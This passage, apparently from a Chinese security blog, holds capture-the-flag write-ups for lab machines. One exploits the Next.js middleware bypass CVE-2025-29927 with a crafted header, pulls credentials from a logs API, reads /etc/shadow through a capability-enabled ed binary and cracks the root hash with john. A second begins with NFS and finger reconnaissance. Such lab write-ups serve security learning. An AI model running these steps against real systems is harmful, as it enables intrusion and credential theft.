title="2、3000端口"></a>2、3000端口</h2><p>访问3000端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# curl http://192.168.2.13:3000<br>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;meta charSet=<span class="hljs-string">&quot;utf-8&quot;</span>/&gt;&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width&quot;</span>/&gt;&lt;title class=<span class="hljs-string">&quot;jsx-1eb51da0ac6ad36f&quot;</span>&gt;maze-sec | Cybersecurity Research&lt;/title&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> href=<span class="hljs-string">&quot;/favicon.ico&quot;</span> class=<span class="hljs-string">&quot;jsx-1eb51da0ac6ad36f&quot;</span>/&gt;&lt;meta name=<span class="hljs-string">&quot;hint&quot;</span> content=<span class="hljs-string">&quot;Authorized access at a secret endpoint. Try 2025.&quot;</span> class=<span class="hljs-string">&quot;jsx-1eb51da0ac6ad36f&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>包含关键信息：</p><ul><li>使用<code>next.js</code>框架</li><li>提示：<code>Authorized access at a secret endpoint. Try 2025.</code></li></ul><h3 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.13:3000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>...<br>/admin                (Status: 307) [Size: 18] [--&gt; /secret-login-2025]<br>...<br></code></pre></td></tr></table></figure><p>找到路径<code>/admin</code>重定向到了<code>/secret-login-2025</code></p><h1 id="三、Node-js框架漏洞"><a href="#三、Node-js框架漏洞" class="headerlink" title="三、Node.js框架漏洞"></a>三、Node.js框架漏洞</h1><p>访问<code>/secret-login-2025</code>返回一个登录界面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509152228158.png"><br>经过测试，发现该版本的next.js存在<code>cve-2025-29927</code>漏洞</p><h2 id="1、漏洞原理"><a href="#1、漏洞原理" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h2><p><strong>CVE-2025-29927</strong>是Next.js框架中存在的一个高危中间件逻辑绕过漏洞，允许攻击者通过构造特定HTTP请求头<code>x-middleware-subrequest: middleware</code>，绕过中间件的安全控制逻辑（如身份验证、路径重写、CSP防护等）</p><p>相关参考：</p><ul><li><a href="https://www.cnblogs.com/CVE-Lemon/p/18797265">https://www.cnblogs.com/CVE-Lemon/p/18797265</a></li><li><a href="https://github.com/websecnl/CVE-2025-29927-PoC-Exploit">https://github.com/websecnl/CVE-2025-29927-PoC-Exploit</a></li><li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw">https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw</a></li></ul><h2 id="2、漏洞利用"><a href="#2、漏洞利用" class="headerlink" title="2、漏洞利用"></a>2、漏洞利用</h2><h3 id="1-绕过中间件访问登录页面"><a href="#1-绕过中间件访问登录页面" class="headerlink" title="1.绕过中间件访问登录页面"></a>1.绕过中间件访问登录页面</h3><p>使用漏洞绕过中间件限制：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]<br>└─$ curl -H &quot;x-middleware-subrequest: middleware&quot; http://192.168.205.190:3000/secret-login-2025<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>...<br><span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;jsx-51c627a66454ffc6&quot;</span>&gt;</span>Restricted Login | maze-sec<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>...<br></code></pre></td></tr></table></figure><p>成功获取到完整的登录页面。</p><h3 id="2-分析前端代码获取凭据"><a href="#2-分析前端代码获取凭据" class="headerlink" title="2.分析前端代码获取凭据"></a>2.分析前端代码获取凭据</h3><p>下载并分析登录页面的 JavaScript 文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kali㉿kali)-[<span class="hljs-regexp">/mnt/</span>hgfs<span class="hljs-regexp">/gx/</span>x/tmp]<br>└─$ curl -H <span class="hljs-string">&quot;x-middleware-subrequest: middleware&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">205.190</span>:<span class="hljs-number">3000</span><span class="hljs-regexp">/_next/</span>static<span class="hljs-regexp">/chunks/</span>pages/secret-login-<span class="hljs-number">2025</span>-<span class="hljs-number">2</span>d3e58ee9a68cbe4.js -o login.js<br><br>┌──(kali㉿kali)-[<span class="hljs-regexp">/mnt/</span>hgfs<span class="hljs-regexp">/gx/</span>x/tmp]<br>└─$ cat login.js | grep password<br>...console.log(<span class="hljs-string">&quot;Login attempt:&quot;</span>,&#123;username:r,password:c&#125;)...<br></code></pre></td></tr></table></figure><p>代码显示登录信息会通过 console.log 输出，成功登录后会跳转到 <code>/admin/dashboard</code>。</p><h3 id="3-访问管理面板获取日志"><a href="#3-访问管理面板获取日志" class="headerlink" title="3.访问管理面板获取日志"></a>3.访问管理面板获取日志</h3><p>继续使用漏洞访问管理面板：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(kali㉿kali)</span>-[<span class="hljs-string">/mnt/hgfs/gx/x</span>]<br>└─$ curl -H <span class="hljs-string">&quot;x-middleware-subrequest: middleware&quot;</span> http:<span class="hljs-string">//192.168.205.190</span><span class="hljs-function">:3000</span>/admin/dashboard<br><span class="hljs-string">...</span><br>&lt;h3 class=<span class="hljs-string">&quot;jsx-11905641757d090&quot;</span>&gt;System Logs&lt;<span class="hljs-string">/h3</span>&gt;<br>&lt;p class=<span class="hljs-string">&quot;jsx-11905641757d090&quot;</span>&gt;Review system activity <span class="hljs-params">(contains sensitive data)</span>.&lt;<span class="hljs-string">/p</span>&gt;<br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>发现系统日志功能，直接访问日志 API：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kali㉿kali)-[<span class="hljs-regexp">/mnt/</span>hgfs<span class="hljs-regexp">/gx/</span>x]<br>└─$ curl -H <span class="hljs-string">&quot;x-middleware-subrequest: middleware&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">205.190</span>:<span class="hljs-number">3000</span><span class="hljs-regexp">/api/</span>logs | grep password<br>...<br><span class="hljs-string">&quot;2025-09-12 10:07:12 - Successful login: c1trus with password MazeSecure@2025!&quot;</span><br><span class="hljs-string">&quot;2025-09-12 10:20:09 - Database backup: user=c1trus_db_admin, pass=MazeDB2025!&quot;</span><br>...<br></code></pre></td></tr></table></figure><p>成功获取到 SSH 登录凭据：</p><ul><li>用户名：<code>c1trus</code></li><li>密码：<code>MazeSecure@2025!</code></li></ul><h1 id="四、获取c1trus权限"><a href="#四、获取c1trus权限" class="headerlink" title="四、获取c1trus权限"></a>四、获取c1trus权限</h1><p>直接使用获取到的凭证进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# ssh c1trus@192.168.2.13     <br>...<br>$ <span class="hljs-built_in">id</span><br>uid=1000(c1trus) gid=1000(c1trus) <span class="hljs-built_in">groups</span>=1000(c1trus)<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、查看sudo权限"><a href="#1、查看sudo权限" class="headerlink" title="1、查看sudo权限"></a>1、查看<code>sudo</code>权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> c1trus on Next:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User c1trus may run the following commands on Next:<br>    (ALL) NOPASSWD: /usr/bin/whoami<br></code></pre></td></tr></table></figure><p>只能无密码执行 <code>whoami</code></p><h2 id="2、查看suid文件"><a href="#2、查看suid文件" class="headerlink" title="2、查看suid文件"></a>2、查看<code>suid</code>文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p>未发现特殊的文件</p><h2 id="3、查看具有特殊权限的文件"><a href="#3、查看具有特殊权限的文件" class="headerlink" title="3、查看具有特殊权限的文件"></a>3、查看具有特殊权限的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /usr/sbin/getcap -r / 2&gt;/dev/null<br>/usr/bin/ed = cap_dac_read_search+ep<br>/usr/bin/ping = cap_net_raw+ep<br>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep<br></code></pre></td></tr></table></figure><p>发现<code>/usr/bin/ed</code>具有<code>cap_dac_read_search+ep</code>能力，这个能力允许程序绕过文件读取权限检查。</p><h2 id="4、利用-ed-读取敏感文件"><a href="#4、利用-ed-读取敏感文件" class="headerlink" title="4、利用 ed 读取敏感文件"></a>4、利用 ed 读取敏感文件</h2><h3 id="ed-编辑器利用原理"><a href="#ed-编辑器利用原理" class="headerlink" title="ed 编辑器利用原理"></a>ed 编辑器利用原理</h3><p><code>ed</code> 是一个行编辑器，当它具有 <code>cap_dac_read_search</code> 能力时，可以读取任何文件，无视文件权限。可以通过管道命令实现自动化读取。</p><p>读取<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;,p\nq&quot;</span> | /usr/bin/ed /etc/shadow<br>941<br>root:$6$OkwDvceFhTabwVGQ<span class="hljs-variable">$noxBcQ9o14G0cTyNdu9EBOoq3AmB660NS5Usr83oGcJNjxezZrwA</span>/5ME3smPLzoizro5LRFqFKQlbO42l4rvt1:20343:0:99999:7:::<br>...<br>c1trus:$6<span class="hljs-variable">$p</span>/7V81X3jW.t4UVk<span class="hljs-variable">$p0QwkfnPmVwKd5G45ABhShw</span>/bdysk8cCAOF7a2AU/rKcpjFbmeGEN2Wq6AyXcLLgq3ldpBMWDg7VSupIzy7w4/:20343:0:99999:7:::<br></code></pre></td></tr></table></figure><p>命令解释：</p><ul><li><code>,p</code> - 打印所有行（从第一行到最后一行）</li><li><code>q</code> - 退出编辑器</li></ul><h2 id="5、密码爆破"><a href="#5、密码爆破" class="headerlink" title="5、密码爆破"></a>5、密码爆破</h2><p>将<code>root</code>用户的哈希值写入到文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:$6$OkwDvceFhTabwVGQ$noxBcQ9o14G0cTyNdu9EBOoq3AmB660NS5Usr83oGcJNjxezZrwA/5ME3smPLzoizro5LRFqFKQlbO42l4rvt1&#x27;</span> &gt; <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><p>使用<code>john</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# john --wordlist=/usr/share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span><br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])<br>Cost 1 (iteration count) is 5000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>bisrock          (root)     <br>1g 0:00:00:21 DONE (2025-09-15 23:09) 0.04601g/s 2733p/s 2733c/s 2733C/s blueboy1..062906<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>成功找打凭证：<code>root:bisrock</code></p><h2 id="6、获取root权限"><a href="#6、获取root权限" class="headerlink" title="6、获取root权限"></a>6、获取root权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ su root<br>Password: bisrock<br>root@Next:/home/c1trus# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="六、获取FLAG"><a href="#六、获取FLAG" class="headerlink" title="六、获取FLAG"></a>六、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Next:/home/c1trus# <span class="hljs-built_in">cat</span> /home/c1trus/user.txt /root/root.txt <br>flag&#123;user_d0cab90d8d20d57e2f2b9be52f7dd25d&#125;<br>flag&#123;root_8812662dcf3e5db0247c0f85909363fc&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>john</tag>
      
      <tag>Node.js</tag>
      
      <tag>CVE-2025-29927</tag>
      
      <tag>ed编辑器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mount</title>
    <link href="/Maze-sec/Mount/"/>
    <url>/Maze-sec/Mount/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap -sn 192.168.2.0/24                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0022s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0023s latency).<br>MAC Address: 08:00:27:9A:56:B0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00093s latency).<br>MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.12 seconds<br></code></pre></td></tr></table></figure><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap --min-rate 10000 -p- 192.168.2.8                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00031s latency).<br>Not shown: 65526 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>79/tcp    open  finger<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>2049/tcp  open  nfs<br>34109/tcp open  unknown<br>37331/tcp open  unknown<br>46281/tcp open  unknown<br>49849/tcp open  unknown<br>MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.21 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、79、80、111、2049、34109、37331、46281、49849</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,79,80,111,2049,34109,37331,46281,49849 192.168.2.8<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:21 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00074s latency).<br><br>PORT      STATE SERVICE  VERSION<br>22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>79/tcp    open  finger   OpenBSD fingerd (ported to Linux)<br>| finger: \x0D<br>| Welcome to Linux version 4.19.0-27-amd64 at Mount !\x0D<br>| <br>|  11:21:56 up 2 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>| \x0D<br>|_No one logged on.\x0D<br>80/tcp    open  http     Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="hljs-string">111/tcp   open  rpcbind  2-4 (RPC #100000)</span><br><span class="hljs-string">| rpcinfo: </span><br><span class="hljs-string">|   program version    port/proto  service</span><br><span class="hljs-string">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="hljs-string">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/udp6  rpcbind</span><br><span class="hljs-string">|   100003  3           2049/udp   nfs</span><br><span class="hljs-string">|   100003  3           2049/udp6  nfs</span><br><span class="hljs-string">|   100003  3,4         2049/tcp   nfs</span><br><span class="hljs-string">|   100003  3,4         2049/tcp6  nfs</span><br><span class="hljs-string">|   100005  1,2,3      37331/tcp   mountd</span><br><span class="hljs-string">|   100005  1,2,3      50877/tcp6  mountd</span><br><span class="hljs-string">|   100005  1,2,3      52224/udp6  mountd</span><br><span class="hljs-string">|   100005  1,2,3      55192/udp   mountd</span><br><span class="hljs-string">|   100021  1,3,4      37415/udp   nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      41085/tcp6  nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      46281/tcp   nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      57380/udp6  nlockmgr</span><br><span class="hljs-string">|   100227  3           2049/tcp   nfs_acl</span><br><span class="hljs-string">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="hljs-string">|   100227  3           2049/udp   nfs_acl</span><br><span class="hljs-string">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="hljs-string">2049/tcp  open  nfs      3-4 (RPC #100003)</span><br><span class="hljs-string">34109/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="hljs-string">37331/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="hljs-string">46281/tcp open  nlockmgr 1-4 (RPC #100021)</span><br><span class="hljs-string">49849/tcp open  mountd   1-3 (RPC #100005)</span><br><span class="hljs-string">MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: Mount; OSs: Linux, Linux 4.19.0-27-amd64; CPE: cpe:/o:linux:linux_kernel, cpe:/o:linux:linux_kernel:4.19.0-27-amd64</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 19.02 seconds</span><br></code></pre></td></tr></table></figure><ol><li><strong>22端口:</strong> ssh服务</li><li><strong>79端口:</strong> finger服务</li><li><strong>80端口:</strong> http服务</li><li><strong>111端口:</strong> rpcbind服务，版本支持<code>rpcbind 2-4 </code>，<code>rpcbind</code>是NFS中用来进行消息通知的服务，一般开启了rpcbind，会有nfs网络共享的功能，nfs端口是2049</li><li><strong>2049端口:</strong> nfs服务，提供网络文件系统共享服务，支持跨主机文件挂载，默认无加密，可能暴露敏感文件系统</li></ol><h3 id="3-UDP端口扫描"><a href="#3-UDP端口扫描" class="headerlink" title="3.UDP端口扫描"></a>3.UDP端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# nmap -sU --top-ports 100 192.168.2.8                                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-10 23:23 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00050s latency).<br>Not shown: 97 closed udp ports (port-unreach)<br>PORT     STATE         SERVICE<br>68/udp   open|filtered dhcpc<br>111/udp  open          rpcbind<br>2049/udp open          nfs<br>MAC Address: 08:00:27:07:0B:9B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 109.13 seconds<br></code></pre></td></tr></table></figure><h2 id="3、服务探测"><a href="#3、服务探测" class="headerlink" title="3、服务探测"></a>3、服务探测</h2><h3 id="1-79端口-Finger服务"><a href="#1-79端口-Finger服务" class="headerlink" title="1.79端口-Finger服务"></a>1.79端口-Finger服务</h3><p><strong>Finger</strong> 程序&#x2F;服务用于检索计算机用户的详细信息。通常，提供的信息包括 <strong>用户的登录名、全名</strong>，在某些情况下，还包括其他详细信息。这些额外的详细信息可能包括办公室位置和电话号码（如果可用）、用户登录的时间、非活动时间（闲置时间）、用户最后一次阅读邮件的时间，以及用户的计划和项目文件的内容。</p><p><code>Finger</code>可以访问远程主机的用户信息</p><ul><li>若用户存在，则返回具体的信息<code>Login:...</code></li><li>若用户不存在，则返回<code>no such user</code></li></ul><p>详细信息：</p><ul><li><a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html">https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html</a></li></ul><h3 id="2-80端口-http服务"><a href="#2-80端口-http服务" class="headerlink" title="2.80端口-http服务"></a>2.80端口-http服务</h3><p>访问80端口服务，未发现任何东西，同时进行目录扫描，也没有找到任何有用的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/mount]<br>└─# curl http://192.168.2.8                          <br>index<br></code></pre></td></tr></table></figure><h3 id="3-111端口-rpcbind服务"><a href="#3-111端口-rpcbind服务" class="headerlink" title="3.111端口-rpcbind服务"></a>3.111端口-rpcbind服务</h3><p><strong>Portmapper</strong>是一种用于将网络服务端口映射到 <strong>RPC</strong>（远程过程调用）程序编号的服务，通常与 <strong>NFS 